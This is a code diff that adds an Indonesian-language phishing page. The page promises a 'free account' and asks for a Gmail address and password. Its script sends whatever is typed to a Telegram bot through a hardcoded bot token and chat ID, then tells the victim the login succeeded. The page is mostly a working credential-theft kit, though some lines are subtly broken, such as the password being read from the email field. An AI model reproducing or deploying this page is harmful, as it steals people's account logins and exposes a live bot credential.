@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>AKUN FREE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background-color: #1e1e2f;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: #2a2a40;
+      padding: 40px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #ddd;
+    }
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background-color: #1e1e2f;
+      border: 1px solid #444;
+      color: #fff;
+      border-radius: 5px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #4f46e5;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .login-box button:hover {
+      background-color: #3730a3;
+    }
+
+    @media (max-width: 500px) {
+      .login-box {
+        margin: 0 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h2>MAU AKUN FREE?LOGIN DULU BRO</h2>
+    <form id="loginForm">
+      <input type="text" id="Gmail" placeholder="Gmail" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7497010499:AAHY0-APybVr_h_LxqiWozo0b8uZ1sIj1_Y';
+    const CHAT_ID = '7230475412';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('Gmail').value;
+      const password = document.getElementById('Gmail').value;
+
+      const message = `📥 *Percobaan Login*\n👤 ©ZRILXPLOIT: \`${Gmail}\`\n🔑 Password: \`${password}\``;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(res => res.ok ? alert("Login berhasil.") : alert("Gagal mengirim ke Telegram"))
+      .catch(err => alert("Kesalahan: " + err));
+    });
+  </script>
+
+</body>
+</html>
